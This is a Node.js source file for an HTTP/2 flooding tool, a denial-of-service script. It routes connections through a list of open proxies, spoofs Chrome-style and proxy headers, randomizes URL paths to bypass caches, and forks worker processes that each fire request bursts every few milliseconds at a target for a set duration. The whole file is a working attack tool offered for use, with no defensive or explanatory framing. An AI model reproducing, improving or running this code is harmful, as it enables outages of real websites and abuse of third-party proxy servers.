const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs").promises;

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', () => {});

if (process.argv.length < 7) {
    console.log(`Usage: target time rate thread proxyfile`);
    process.exit();
}

const headers = {};
let proxies = [];

async function readLines(filePath) {
    const data = await fs.readFile(filePath, "utf-8");
    const validProxies = data.split(/\r?\n/).filter(line => {
        const [ip, port] = line.split(":");
        return ip && port && !isNaN(port) && ip.match(/^\d+\.\d+\.\d+\.\d+$/);
    });
    console.log(`Loaded ${validProxies.length} valid proxies`);
    return validProxies;
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    Rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6]
};

const sig = [
    'ecdsa_secp256r1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512',
    'ecdsa_secp384r1_sha384'
];

const accept_header = [
    '*/*',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'application/json',
    'text/css'
];

const lang_header = [
    'en-US',
    'zh-CN',
    'fr-FR',
    'ja-JP'
];

const encoding_header = [
    'gzip, deflate, br',
    'deflate',
    'gzip',
    'br'
];

const version = [
    '"Google Chrome";v="113", "Chromium";v="113", ";Not A Brand";v="99"',
    '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
    '"Safari";v="14.1.2", "Chrome";v="91.0.4472.164", "Safari";v="14.1.2"'
];

const rateHeaders = [
    { "akamai-origin-hop": randstr(12) },
    { "proxy-client-ip": randstr(12) },
    { "via": randstr(12) },
    { "cluster-ip": randstr(12) }
];

const parsedTarget = url.parse(args.target);
let proxyIndex = 0;

function getNextProxy() {
    const proxy = proxies[proxyIndex % proxies.length];
    proxyIndex++;
    return proxy;
}

const clientPool = new Map();
function getClient(proxyAddr, parsedTarget) {
    const key = proxyAddr + parsedTarget.href;
    if (clientPool.has(key)) return clientPool.get(key);
    const tlsConn = tls.connect(443, parsedTarget.host, {
        secure: true,
        ALPNProtocols: ['h2'],
        ciphers: 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384',
        ecdhCurve: 'P-256:P-384',
        host: parsedTarget.host,
        servername: parsedTarget.host,
        rejectUnauthorized: false,
        secureOptions: crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION |
            crypto.constants.SSL_OP_NO_TICKET |
            crypto.constants.SSL_OP_NO_COMPRESSION
    });
    tlsConn.setKeepAlive(true, 60000);
    const client = http2.connect(parsedTarget.href, {
        protocol: "https:",
        settings: {
            headerTableSize: 65536,
            maxConcurrentStreams: 1000,
            initialWindowSize: 12582912,
            maxHeaderListSize: 65536,
            enablePush: false
        },
        createConnection: () => tlsConn
    });
    clientPool.set(key, { client, tlsConn });
    client.on("error", () => clientPool.delete(key));
    client.on("close", () => clientPool.delete(key));
    return { client, tlsConn };
}

class NetSocket {
    constructor() {}

    HTTP(options, callback) {
        const payload = `CONNECT ${options.address} HTTP/1.1\r\nHost: ${options.address}\r\nConnection: Keep-Alive\r\n\r\n`;
        const buffer = Buffer.from(payload);
        const connection = net.connect({
            host: options.host,
            port: options.port,
            noDelay: true
        });

        connection.setTimeout(options.timeout * 1000);
        connection.setKeepAlive(true, 60000);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (!isAlive) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", () => {
            connection.destroy();
            return callback(undefined, "error: connection failed");
        });
    }
}

const Socker = new NetSocket();
headers[":method"] = "GET";
headers[":authority"] = parsedTarget.host;
headers[":path"] = parsedTarget.path + "?" + randstr(10) + "=" + randstr(5);
headers[":scheme"] = "https";
headers["sec-ch-ua"] = version[Math.floor(Math.random() * version.length)];
headers["sec-ch-ua-platform"] = "Windows";
headers["sec-ch-ua-mobile"] = "?0";
headers["accept-encoding"] = encoding_header[Math.floor(Math.random() * encoding_header.length)];
headers["accept-language"] = lang_header[Math.floor(Math.random() * lang_header.length)];
headers["upgrade-insecure-requests"] = "1";
headers["accept"] = accept_header[Math.floor(Math.random() * accept_header.length)];
headers["sec-fetch-mode"] = "navigate";
headers["sec-fetch-dest"] = "document";
headers["sec-fetch-site"] = "same-origin";
headers["sec-fetch-user"] = "?1";
headers["x-requested-with"] = "XMLHttpRequest";

let cachedHeaders = null;
setInterval(() => {
    cachedHeaders = {
        ...headers,
        ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
        ":path": parsedTarget.path + "?" + randstr(10) + "=" + randstr(5)
    };
}, 1000);

let successCount = 0;
function runFlooder() {
    const proxyAddr = getNextProxy();
    const parsedProxy = proxyAddr.split(":");
    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 10
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) {
            if (connection) connection.destroy();
            return setTimeout(() => runFlooder(), 50);
        }
        const { client } = getClient(proxyAddr, parsedTarget);
        client.on("connect", () => {
            const requests = Array(args.Rate).fill().map(() => {
                const request = client.request(cachedHeaders || headers);
                request.on("response", () => {
                    successCount++;
                    request.close();
                    request.destroy();
                });
                request.on("error", () => {
                    request.close();
                    request.destroy();
                });
                request.end();
                return request;
            });
        });
    });
}

if (cluster.isMaster) {
    (async () => {
        proxies = await readLines(args.proxyFile);
        for (let counter = 1; counter <= args.threads; counter++) {
            cluster.fork();
        }
        console.clear();
        console.log('\x1b[1m\x1b[34m' + 'Target: ' + '\x1b[0m' + '\x1b[1m' + parsedTarget.host + '\x1b[0m');
        console.log('\x1b[1m\x1b[33m' + 'Duration: ' + '\x1b[0m' + '\x1b[1m' + args.time + '\x1b[0m');
        console.log('\x1b[1m\x1b[32m' + 'Threads: ' + '\x1b[0m' + '\x1b[1m' + args.threads + '\x1b[0m');
        console.log('\x1b[1m\x1b[31m' + 'Requests per second: ' + '\x1b[0m' + '\x1b[1m' + args.Rate + '\x1b[0m');
        setTimeout(() => process.exit(1), args.time * 1000);
    })();
} else {
    setInterval(runFlooder, 5);
    setInterval(() => {
        console.log(`RPS: ${successCount / 10}`);
        successCount = 0;
    }, 10000);
}
